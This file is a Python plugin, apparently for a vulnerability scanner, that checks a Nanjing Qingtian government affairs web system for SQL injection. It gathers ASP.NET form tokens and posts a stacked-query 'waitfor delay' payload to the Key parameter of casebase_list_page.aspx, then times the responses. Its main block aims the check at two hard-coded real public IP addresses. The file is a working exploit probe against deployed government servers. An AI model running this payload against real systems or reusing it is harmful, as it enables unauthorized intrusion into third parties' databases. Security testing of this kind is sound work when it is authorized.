#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 南京擎天政务系统SQL注入(三)
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2015-0100237
description:
    webpages/casebase_list_page.aspx parameter:Key
    stacked queries, UNION query
    不同版本union查询的列数可能不同，所以这里用延时来检测
    这个写一块儿确实有难度，不要喷
'''

import time
import re

def assign(service, arg):
    if service == 'skytech':
        return True, arg

def audit(arg):
    url = arg + 'webpages/casebase_list_page.aspx'
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    # proxy = ('127.0.0.1', 8887)
    #获取viewstate等
    code, head, res, err, _ = curl.curl2(url)
    if code != 200:
        return False
    m = re.search(r'id="__VIEWSTATE"\s*value="([a-zA-Z0-9+/=]*)"',res)
    #print res
    if not m:
        viewstate = ''
    else:
        viewstate = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__EVENTVALIDATION"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        eventvalidation = ''
    else:
        eventvalidation = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__VIEWSTATEGENERATOR"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        viewstategenerator = ''
    else:
        viewstategenerator = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    #构造post表单
    payload = 'test%27%29%3Bwaitfor+delay+%270%3A0%3A0%27--'
    post = '__EVENTTARGET=Btn_Search&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&Ctr_BeginTime=2015-12-07&Ctr_EndTime=2016-01-07&Key={payload}'.format(
        viewstate = viewstate,
        viewstategenerator = viewstategenerator,
        eventvalidation = eventvalidation,
        payload = payload
    )
    post_delay_5 = post.replace('%3A0%27--', '%3A5%27--')
    t1 = time.time()
    code, head, res, err, _ = curl.curl2(url, post=post, referer=url, header=content_type)
    if code >= 400:
        return False
    t2 = time.time()
    code, head, res, err, _ = curl.curl2(url, post=post_delay_5, referer=url, header=content_type)
    if code >= 400:
        return False
    t3 = time.time()
    if (t1 + t3 - (2 * t2)) > 3:
        security_hole('SQL Injection: ' + url + ' Parameter:Key')

if __name__ == '__main__':
    from dummy import *
    audit(assign('skytech', 'http://58.222.202.135:81/')[1])
    audit(assign('skytech', 'http://61.178.185.50/mqweb/')[1])